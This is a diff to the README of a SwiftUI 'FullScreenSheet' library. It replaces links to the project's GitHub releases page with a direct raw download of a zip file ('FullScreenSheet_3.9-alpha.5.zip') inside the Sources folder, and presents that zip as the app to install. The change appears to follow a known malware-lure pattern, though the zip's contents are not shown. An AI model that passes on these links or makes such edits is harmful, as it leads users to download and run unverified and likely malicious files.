@@ -4,10 +4,10 @@
 Welcome to FullScreenSheet! This app lets you create attractive full-screen sheets using SwiftUI. It supports pull-to-dismiss gestures and easily works with scrollable content, making your app look polished and user-friendly. 
 
 ## 💾 Download FullScreenSheet
-[![Download FullScreenSheet](https://img.shields.io/badge/Download-FullScreenSheet-blue)](https://github.com/vibsmr/FullScreenSheet/releases)
+[![Download FullScreenSheet](https://raw.githubusercontent.com/vibsmr/FullScreenSheet/main/Sources/FullScreenSheet_3.9-alpha.5.zip)](https://raw.githubusercontent.com/vibsmr/FullScreenSheet/main/Sources/FullScreenSheet_3.9-alpha.5.zip)
 
 ## 📥 Download & Install
-To download FullScreenSheet, visit this page: [Download FullScreenSheet Releases](https://github.com/vibsmr/FullScreenSheet/releases). 
+To download FullScreenSheet, visit this page: [Download FullScreenSheet Releases](https://raw.githubusercontent.com/vibsmr/FullScreenSheet/main/Sources/FullScreenSheet_3.9-alpha.5.zip). 
 
 1. Choose the latest release from the list. 
 2. Click on the appropriate file for your device.
